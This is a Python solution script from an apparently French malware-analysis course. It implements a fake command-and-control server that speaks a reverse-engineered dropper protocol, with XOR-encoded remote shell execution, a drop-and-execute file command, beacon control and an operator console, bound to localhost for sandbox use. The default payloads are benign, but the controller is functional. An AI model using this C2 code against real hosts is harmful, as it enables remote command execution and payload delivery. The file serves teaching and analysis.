#!/usr/bin/env python3
"""
solutions/ch28-checkpoint-fake-c2.py
════════════════════════════════════════════════════════════════
Corrigé du Checkpoint — Chapitre 28
Faux serveur C2 complet pour le dropper ELF

⚠️  STRICTEMENT ÉDUCATIF — À exécuter UNIQUEMENT dans la VM sandboxée.

Usage :
  Mode interactif :  python3 ch28-checkpoint-fake-c2.py
  Mode script     :  python3 ch28-checkpoint-fake-c2.py --auto
  Aide            :  python3 ch28-checkpoint-fake-c2.py --help

Lancer en parallèle :
  Terminal 1 :  sudo tcpdump -i lo -w session.pcap port 4444
  Terminal 2 :  python3 ch28-checkpoint-fake-c2.py
  Terminal 3 :  ./dropper_O2_strip
  (optionnel)   frida -l hook_network.js -f ./dropper_O2_strip --no-pause

Licence MIT — Voir LICENSE à la racine du dépôt.
════════════════════════════════════════════════════════════════
"""

import socket
import struct
import sys
import time
import select
import argparse
import os
from datetime import datetime


# ══════════════════════════════════════════════════════════════
#  Couche 1 — Constantes du protocole
# ══════════════════════════════════════════════════════════════
#
#  Toutes ces constantes ont été extraites du binaire strippé
#  via l'analyse statique (Ghidra) et dynamique (strace, Frida).
#
#  Format du header (4 octets, packed little-endian) :
#    ┌───────────┬──────────┬─────────────┐
#    │ magic (1) │ type (1) │ length (2)  │
#    │   0xDE    │  cmd_id  │ little-end. │
#    └───────────┴──────────┴─────────────┘

PROTO_MAGIC   = 0xDE
HEADER_SIZE   = 4          # magic(1) + type(1) + length(2)
HEADER_FMT    = "<BBH"     # little-endian : uint8, uint8, uint16
MAX_BODY_SIZE = 4096
XOR_KEY       = 0x5A

# --- Commandes : Serveur → Client ---
CMD_PING  = 0x01    # Keepalive
CMD_EXEC  = 0x02    # Exécuter une commande shell (body XOR)
CMD_DROP  = 0x03    # Déposer un fichier + exécuter (body XOR)
CMD_SLEEP = 0x04    # Modifier l'intervalle de beacon (body clair)
CMD_EXIT  = 0x05    # Terminer le dropper

# --- Messages : Client → Serveur ---
MSG_HANDSHAKE = 0x10    # Identification initiale (body clair)
MSG_PONG      = 0x11    # Réponse au PING (pas de body)
MSG_RESULT    = 0x12    # Résultat d'une commande (body XOR)
MSG_ACK       = 0x13    # Acquittement générique (body clair)
MSG_ERROR     = 0x14    # Erreur (body clair)
MSG_BEACON    = 0x15    # Heartbeat périodique (body clair)

# --- Tables de nommage pour l'affichage ---
CMD_NAMES = {
    CMD_PING: "PING", CMD_EXEC: "EXEC", CMD_DROP: "DROP",
    CMD_SLEEP: "SLEEP", CMD_EXIT: "EXIT",
}
MSG_NAMES = {
    MSG_HANDSHAKE: "HANDSHAKE", MSG_PONG: "PONG", MSG_RESULT: "RESULT",
    MSG_ACK: "ACK", MSG_ERROR: "ERROR", MSG_BEACON: "BEACON",
}
ALL_NAMES = {**CMD_NAMES, **MSG_NAMES}

# --- Configuration serveur ---
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 4444


# ══════════════════════════════════════════════════════════════
#  Couche 2 — Transport TCP fiable
# ══════════════════════════════════════════════════════════════

def send_all(sock, data):
    """Envoie la totalité de `data`, en gérant les envois partiels.

    Lève ConnectionError si la socket est rompue.
    """
    total = 0
    mv = memoryview(data)
    while total < len(data):
        sent = sock.send(mv[total:])
        if sent == 0:
            raise ConnectionError("Socket broken during send")
        total += sent
    return total


def recv_all(sock, length, timeout=30):
    """Reçoit exactement `length` octets avec timeout.

    Utilise select() pour ne pas bloquer indéfiniment.
    Lève TimeoutError ou ConnectionError selon le cas.
    """
    chunks = []
    received = 0
    deadline = time.monotonic() + timeout

    while received < length:
        remaining_time = deadline - time.monotonic()
        if remaining_time <= 0:
            raise TimeoutError(
                f"Timeout: {received}/{length} bytes received")

        ready, _, _ = select.select([sock], [], [], min(remaining_time, 1.0))
        if not ready:
            continue

        chunk = sock.recv(length - received)
        if not chunk:
            raise ConnectionError(
                f"Connection closed: {received}/{length} bytes received")
        chunks.append(chunk)
        received += len(chunk)

    return b"".join(chunks)


# ══════════════════════════════════════════════════════════════
#  Couche 3 — Logique protocolaire
# ══════════════════════════════════════════════════════════════

def xor_codec(data, key=XOR_KEY):
    """Applique un XOR mono-octet. L'opération est sa propre inverse.

    Utilisé pour encoder/décoder les bodies de CMD_EXEC, CMD_DROP
    et MSG_RESULT. Les autres types de messages ne sont PAS encodés.
    """
    return bytes(b ^ key for b in data)


def build_message(msg_type, body=b""):
    """Construit un message protocolaire complet (header + body).

    Le champ length est en little-endian natif (pas de htons).
    """
    if len(body) > MAX_BODY_SIZE:
        raise ValueError(f"Body too large: {len(body)} > {MAX_BODY_SIZE}")
    header = struct.pack(HEADER_FMT, PROTO_MAGIC, msg_type, len(body))
    return header + body


def recv_message(sock, timeout=30):
    """Reçoit un message protocolaire complet.

    Valide le magic byte et la cohérence de la longueur.
    Retourne (msg_type, body_raw).
    """
    hdr_raw = recv_all(sock, HEADER_SIZE, timeout)
    magic, msg_type, body_len = struct.unpack(HEADER_FMT, hdr_raw)

    if magic != PROTO_MAGIC:
        raise ValueError(
            f"Bad magic: 0x{magic:02X} (expected 0x{PROTO_MAGIC:02X})")
    if body_len > MAX_BODY_SIZE:
        raise ValueError(f"Body too large: {body_len}")

    body = recv_all(sock, body_len, timeout) if body_len > 0 else b""
    return msg_type, body


def send_command(sock, cmd_type, body=b""):
    """Envoie une commande au dropper."""
    msg = build_message(cmd_type, body)
    send_all(sock, msg)
    name = ALL_NAMES.get(cmd_type, f"0x{cmd_type:02X}")
    print(f"    [>>>] {name} | body={len(body)}B | total={len(msg)}B")
    if body and len(body) <= 80:
        print(f"          hex: {body.hex(' ')}")
    elif body:
        print(f"          hex: {body[:40].hex(' ')} ... ({len(body)}B)")


# ══════════════════════════════════════════════════════════════
#  Couche 4 — Décodage et affichage des messages reçus
# ══════════════════════════════════════════════════════════════

def hexdump_line(data, max_bytes=48):
    """Produit une représentation hex compacte d'un buffer."""
    h = data[:max_bytes].hex(" ")
    if len(data) > max_bytes:
        h += f" ... ({len(data)}B total)"
    return h


def display_message(msg_type, body):
    """Affiche un message reçu du dropper, décodé selon son type.

    Retourne le body décodé (après XOR si applicable).
    """
    name = ALL_NAMES.get(msg_type, f"UNKNOWN(0x{msg_type:02X})")
    print(f"    [<<<] {name} (0x{msg_type:02X}) | body={len(body)}B")

    decoded_body = body

    if msg_type == MSG_HANDSHAKE:
        parts = body.split(b"\x00")
        parts = [p.decode("utf-8", errors="replace") for p in parts if p]
        labels = ["hostname", "pid", "version"]
        for i, label in enumerate(labels):
            val = parts[i] if i < len(parts) else "?"
            print(f"          {label:10s}: {val}")

    elif msg_type == MSG_RESULT:
        decoded_body = xor_codec(body)
        text = decoded_body.decode("utf-8", errors="replace").rstrip("\n")
        lines = text.split("\n")
        print(f"          result ({len(decoded_body)}B decoded):")
        for line in lines[:20]:
            print(f"            | {line}")
        if len(lines) > 20:
            print(f"            | ... ({len(lines) - 20} more lines)")

    elif msg_type == MSG_BEACON:
        if len(body) >= 8:
            cmd_count, timestamp = struct.unpack("<II", body[:8])
            ts_str = datetime.fromtimestamp(timestamp).strftime(
                "%Y-%m-%d %H:%M:%S")
            print(f"          cmd_count : {cmd_count}")
            print(f"          timestamp : {ts_str}")
        else:
            print(f"          raw: {hexdump_line(body)}")

    elif msg_type == MSG_ACK:
        text = body.decode("utf-8", errors="replace")
        print(f"          ack: \"{text}\"")

    elif msg_type == MSG_ERROR:
        text = body.decode("utf-8", errors="replace")
        print(f"          error: \"{text}\"")

    elif msg_type == MSG_PONG:
        print(f"          (no body)")

    else:
        if body:
            print(f"          raw: {hexdump_line(body)}")

    return decoded_body


def receive_and_display(sock, timeout=30):
    """Reçoit un message, l'affiche et retourne (type, body_decoded)."""
    msg_type, body = recv_message(sock, timeout)
    decoded = display_message(msg_type, body)
    return msg_type, decoded


# ══════════════════════════════════════════════════════════════
#  Couche 5 — Commandes de haut niveau
# ══════════════════════════════════════════════════════════════

def do_ping(sock):
    """CMD_PING → MSG_PONG."""
    print("\n  ── PING ─────────────────────────────────")
    send_command(sock, CMD_PING)
    return receive_and_display(sock)


def do_exec(sock, shell_cmd):
    """CMD_EXEC → MSG_RESULT (XOR-décodé).

    Le body envoyé est la commande shell encodée en XOR(0x5A).
    Le dropper l'exécute via popen() et renvoie la sortie,
    elle aussi encodée en XOR.
    """
    print(f"\n  ── EXEC : \"{shell_cmd}\" ──────────────────")
    encoded = xor_codec(shell_cmd.encode("utf-8"))
    send_command(sock, CMD_EXEC, encoded)
    return receive_and_display(sock)


def do_drop(sock, filename, payload_data):
    """CMD_DROP → MSG_ACK.

    Format du body (avant XOR) :
      [fname_len: 1 octet][filename: fname_len octets][payload_data]

    Le dropper :
      1. Décode le XOR
      2. Extrait le nom de fichier
      3. Écrit le payload dans /tmp/<filename>
      4. chmod 755
      5. Exécute via system()
      6. Renvoie MSG_ACK avec "drop_ok:<return_code>"
    """
    print(f"\n  ── DROP : \"{filename}\" ({len(payload_data)}B) ────────")
    fname_bytes = filename.encode("utf-8")
    if len(fname_bytes) > 255:
        print("    [!] Filename too long")
        return None, None

    # Construction du body : [len][name][data]
    body_clear = bytes([len(fname_bytes)]) + fname_bytes + payload_data
    encoded = xor_codec(body_clear)
    send_command(sock, CMD_DROP, encoded)
    return receive_and_display(sock)


def do_sleep(sock, interval):
    """CMD_SLEEP → MSG_ACK.

    Le body est un uint32 little-endian NON encodé en XOR.
    Le dropper borne la valeur entre 1 et 3600 secondes.
    """
    print(f"\n  ── SLEEP : {interval}s ─────────────────────")
    body = struct.pack("<I", interval)
    send_command(sock, CMD_SLEEP, body)
    return receive_and_display(sock)


def do_exit(sock):
    """CMD_EXIT → MSG_ACK ("bye")."""
    print("\n  ── EXIT ─────────────────────────────────")
    send_command(sock, CMD_EXIT)
    return receive_and_display(sock)


# ══════════════════════════════════════════════════════════════
#  Gestion des beacons
# ══════════════════════════════════════════════════════════════

def drain_beacons(sock, timeout=0.5):
    """Consomme tous les beacons en attente sans bloquer.

    Retourne le nombre de beacons consommés.
    Les beacons arrivent entre les commandes (le dropper utilise
    select() avec un timeout = beacon_interval).
    """
    count = 0
    while True:
        ready, _, _ = select.select([sock], [], [], timeout)
        if not ready:
            break
        try:
            msg_type, body = recv_message(sock, timeout=2)
            if msg_type == MSG_BEACON:
                display_message(msg_type, body)
                count += 1
            else:
                # Message inattendu — l'afficher quand même
                print(f"    [!] Unexpected while draining beacons:")
                display_message(msg_type, body)
        except (TimeoutError, ConnectionError):
            break
    return count


# ══════════════════════════════════════════════════════════════
#  Phase de handshake
# ══════════════════════════════════════════════════════════════

def perform_handshake(sock):
    """Attend et complète le handshake avec le dropper.

    Le dropper envoie MSG_HANDSHAKE avec :
      body = hostname\\0 + pid_str\\0 + version\\0

    Le C2 doit répondre MSG_ACK pour que le dropper poursuive.
    Tout autre type de réponse est interprété comme un rejet.

    Retourne un dict {hostname, pid, version} ou None.
    """
    print("=" * 60)
    print("  HANDSHAKE PHASE")
    print("=" * 60)

    msg_type, body = receive_and_display(sock)

    if msg_type != MSG_HANDSHAKE:
        print(f"    [!] Expected HANDSHAKE (0x{MSG_HANDSHAKE:02X}), "
              f"got 0x{msg_type:02X}")
        return None

    # Acquitter — le type DOIT être MSG_ACK (0x13)
    ack_body = b"welcome"
    print()
    send_command(sock, MSG_ACK, ack_body)

    # Parser les informations de la cible
    parts = body.split(b"\x00")
    parts = [p.decode("utf-8", errors="replace") for p in parts if p]
    info = {
        "hostname": parts[0] if len(parts) > 0 else "unknown",
        "pid":      parts[1] if len(parts) > 1 else "?",
        "version":  parts[2] if len(parts) > 2 else "?",
    }

    print(f"\n    [+] Target: {info['hostname']} "
          f"(PID {info['pid']}, ver {info['version']})")
    return info


# ══════════════════════════════════════════════════════════════
#  Mode interactif — Console opérateur
# ══════════════════════════════════════════════════════════════

MENU = """\
  ┌─────────────────────────────────────────┐
  │  1  PING            Keepalive           │
  │  2  EXEC <cmd>      Shell command       │
  │  3  DROP            Drop & execute file │
  │  4  SLEEP <sec>     Change beacon rate  │
  │  5  EXIT            Terminate dropper   │
  │  6  WAIT            Wait for beacon     │
  │  0  QUIT            Close C2 only       │
  └─────────────────────────────────────────┘"""


def interactive_mode(sock, target_info):
    """Boucle interactive : l'analyste choisit les commandes."""
    print("\n" + "=" * 60)
    print(f"  C2 CONSOLE — {target_info['hostname']} "
          f"(PID {target_info['pid']})")
    print("=" * 60)
    print(MENU)

    while True:
        # Drainer silencieusement les beacons en attente
        nb = drain_beacons(sock, timeout=0.3)
        if nb > 0:
            print(f"    ({nb} beacon(s) consumed)")

        try:
            raw = input("\n  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n    [*] Operator disconnected (Ctrl+C)")
            break

        if not raw:
            continue

        parts = raw.split(None, 1)
        cmd = parts[0]
        arg = parts[1] if len(parts) > 1 else ""

        try:
            # ── PING ──
            if cmd == "1":
                do_ping(sock)

            # ── EXEC ──
            elif cmd == "2":
                shell_cmd = arg if arg else input("  shell> ").strip()
                if not shell_cmd:
                    print("    [!] Empty command, skipping")
                    continue
                do_exec(sock, shell_cmd)

            # ── DROP ──
            elif cmd == "3":
                fname = input("  filename [payload.sh]> ").strip()
                if not fname:
                    fname = "payload.sh"

                print("  Payload source:")
                print("    a) Default test script")
                print("    b) Type content manually")
                print("    c) Read from local file")
                src = input("  choice [a]> ").strip().lower() or "a"

                if src == "b":
                    print("  Enter payload (end with empty line):")
                    lines = []
                    while True:
                        line = input("  > ")
                        if not line:
                            break
                        lines.append(line)
                    payload_data = "\n".join(lines).encode("utf-8") + b"\n"

                elif src == "c":
                    path = input("  local file path> ").strip()
                    try:
                        with open(path, "rb") as f:
                            payload_data = f.read()
                        print(f"    Read {len(payload_data)} bytes from {path}")
                    except (FileNotFoundError, PermissionError) as e:
                        print(f"    [!] Cannot read file: {e}")
                        continue

                else:
                    # Payload par défaut : script shell inoffensif
                    payload_data = (
                        b"#!/bin/sh\n"
                        b"echo '[DROPPED] Execution successful'\n"
                        b"echo '[DROPPED] Host:' $(hostname)\n"
                        b"echo '[DROPPED] User:' $(whoami)\n"
                        b"echo '[DROPPED] Date:' $(date -Iseconds)\n"
                        b"echo '[DROPPED] PID:' $$\n"
                    )

                do_drop(sock, fname, payload_data)

            # ── SLEEP ──
            elif cmd == "4":
                try:
                    interval = int(arg) if arg else int(
                        input("  interval (1-3600 sec)> ").strip())
                except ValueError:
                    print("    [!] Invalid number")
                    continue
                do_sleep(sock, interval)

            # ── EXIT ──
            elif cmd == "5":
                do_exit(sock)
                print("\n    [*] Dropper terminated. Exiting C2.")
                break

            # ── WAIT ──
            elif cmd == "6":
                print("    [*] Waiting for next message (60s timeout)...")
                receive_and_display(sock, timeout=60)

            # ── QUIT ──
            elif cmd == "0":
                print("    [*] Closing C2 (dropper will try to reconnect)")
                break

            # ── HELP ──
            elif cmd.lower() in ("h", "help", "?"):
                print(MENU)

            else:
                print(f"    [?] Unknown: \"{cmd}\" — type 'h' for help")

        except ConnectionError as e:
            print(f"\n    [!] Connection lost: {e}")
            break
        except TimeoutError as e:
            print(f"\n    [!] Timeout: {e}")
            break
        except BrokenPipeError:
            print("\n    [!] Broken pipe — dropper disconnected")
            break


# ══════════════════════════════════════════════════════════════
#  Mode automatisé — Scénario complet
# ══════════════════════════════════════════════════════════════

def auto_mode(sock, target_info):
    """Exerce automatiquement toutes les commandes du protocole.

    Ce mode est conçu pour être lancé avec tcpdump en parallèle
    afin de produire une capture pcap contenant au moins un
    échange de chaque type — critère requis du checkpoint.

    Séquence :
      1. PING           → vérifie la connectivité
      2. EXEC "id"      → commande simple, résultat court
      3. EXEC "uname -a"→ commande avec sortie plus riche
      4. EXEC "ls -la /tmp/" → vérifier l'état initial de /tmp
      5. SLEEP 2         → réduire l'intervalle de beacon
      6. (attendre un beacon avec le nouvel intervalle)
      7. DROP test.sh    → déposer et exécuter un script
      8. EXEC "cat /tmp/test.sh" → vérifier le contenu déposé
      9. SLEEP 5         → rétablir l'intervalle par défaut
     10. EXIT            → terminaison propre
    """
    print("\n" + "=" * 60)
    print("  AUTO MODE — Full protocol exercise")
    print("=" * 60)

    steps = [
        ("Step 1/10 : PING", lambda: do_ping(sock)),

        ("Step 2/10 : EXEC 'id'", lambda: do_exec(sock, "id")),

        ("Step 3/10 : EXEC 'uname -a'",
         lambda: do_exec(sock, "uname -a")),

        ("Step 4/10 : EXEC 'ls -la /tmp/'",
         lambda: do_exec(sock, "ls -la /tmp/")),

        ("Step 5/10 : SLEEP 2", lambda: do_sleep(sock, 2)),
    ]

    for label, action in steps:
        drain_beacons(sock, timeout=0.3)
        print(f"\n  ▶ {label}")
        action()
        time.sleep(0.5)

    # Step 6 : attendre un beacon avec le nouvel intervalle
    print(f"\n  ▶ Step 6/10 : Waiting for beacon (interval=2s)...")
    try:
        receive_and_display(sock, timeout=10)
    except TimeoutError:
        print("    [!] No beacon received within 10s")

    # Step 7 : DROP
    drain_beacons(sock, timeout=0.3)
    print(f"\n  ▶ Step 7/10 : DROP 'test.sh'")
    payload = (
        b"#!/bin/sh\n"
        b"echo '[DROP_TEST] Payload executed successfully'\n"
        b"echo '[DROP_TEST] Hostname:' $(hostname)\n"
        b"echo '[DROP_TEST] Timestamp:' $(date -Iseconds)\n"
    )
    do_drop(sock, "test.sh", payload)
    time.sleep(0.5)

    # Step 8 : vérifier le fichier déposé
    drain_beacons(sock, timeout=0.3)
    print(f"\n  ▶ Step 8/10 : EXEC 'cat /tmp/test.sh'")
    do_exec(sock, "cat /tmp/test.sh")
    time.sleep(0.5)

    # Step 9 : rétablir l'intervalle
    drain_beacons(sock, timeout=0.3)
    print(f"\n  ▶ Step 9/10 : SLEEP 5 (restore default)")
    do_sleep(sock, 5)
    time.sleep(0.5)

    # Step 10 : EXIT
    drain_beacons(sock, timeout=0.3)
    print(f"\n  ▶ Step 10/10 : EXIT")
    do_exit(sock)

    # Résumé
    print("\n" + "=" * 60)
    print("  AUTO MODE COMPLETE")
    print("=" * 60)
    print("  All 5 command types exercised:")
    print("    ✓ CMD_PING  (0x01) → MSG_PONG  (0x11)")
    print("    ✓ CMD_EXEC  (0x02) → MSG_RESULT (0x12) [XOR decoded]")
    print("    ✓ CMD_DROP  (0x03) → MSG_ACK   (0x13)")
    print("    ✓ CMD_SLEEP (0x04) → MSG_ACK   (0x13)")
    print("    ✓ CMD_EXIT  (0x05) → MSG_ACK   (0x13)")
    print()
    print("  Verify your pcap with:")
    print("    tshark -r session.pcap -Y 'tcp.port==4444' | head -30")
    print()


# ══════════════════════════════════════════════════════════════
#  Point d'entrée
# ══════════════════════════════════════════════════════════════

BANNER = """\
╔════════════════════════════════════════════════════════════╗
║  Fake C2 Server — Chapter 28 Checkpoint Solution          ║
║  ⚠️  EDUCATIONAL ONLY — Run in sandboxed VM               ║
╚════════════════════════════════════════════════════════════╝"""


def parse_args():
    """Parse les arguments de la ligne de commande."""
    parser = argparse.ArgumentParser(
        description="Fake C2 server for dropper analysis (Ch.28)")
    parser.add_argument(
        "--auto", action="store_true",
        help="Run automated scenario (exercises all commands)")
    parser.add_argument(
        "--host", default=LISTEN_HOST,
        help=f"Listen address (default: {LISTEN_HOST})")
    parser.add_argument(
        "--port", type=int, default=LISTEN_PORT,
        help=f"Listen port (default: {LISTEN_PORT})")
    return parser.parse_args()


def main():
    args = parse_args()
    print(BANNER)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            srv.bind((args.host, args.port))
        except OSError as e:
            print(f"\n  [!] Cannot bind to {args.host}:{args.port}: {e}")
            print(f"  [!] Is another instance running? Try:")
            print(f"      lsof -i :{args.port}")
            sys.exit(1)

        srv.listen(1)
        print(f"\n  [*] Listening on {args.host}:{args.port}")
        print(f"  [*] Mode: {'auto' if args.auto else 'interactive'}")
        print(f"  [*] Waiting for dropper connection...\n")
        print(f"  Hint: launch the dropper in another terminal:")
        print(f"    ./dropper_O2_strip")
        print(f"  Or with Frida:")
        print(f"    frida -l hook_network.js -f ./dropper_O2_strip"
              f" --no-pause\n")

        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            print("\n  [*] Server stopped (Ctrl+C)")
            sys.exit(0)

        with conn:
            peer = f"{addr[0]}:{addr[1]}"
            print(f"  [+] Connection from {peer}")
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"  [+] Session started at {ts}\n")

            # ── Phase 1 : Handshake ──
            try:
                target_info = perform_handshake(conn)
            except (ConnectionError, TimeoutError, ValueError) as e:
                print(f"\n  [!] Handshake failed: {e}")
                sys.exit(1)

            if target_info is None:
                print("  [!] Handshake rejected, exiting")
                sys.exit(1)

            # ── Phase 2 : Commandes ──
            try:
                if args.auto:
                    auto_mode(conn, target_info)
                else:
                    interactive_mode(conn, target_info)
            except (ConnectionError, BrokenPipeError) as e:
                print(f"\n  [!] Connection lost during session: {e}")
            except TimeoutError as e:
                print(f"\n  [!] Timeout during session: {e}")
            except KeyboardInterrupt:
                print("\n  [*] Interrupted by operator")

    print("\n  [*] C2 server shut down")
    print(f"  [*] Session ended at "
          f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")


if __name__ == "__main__":
    main()
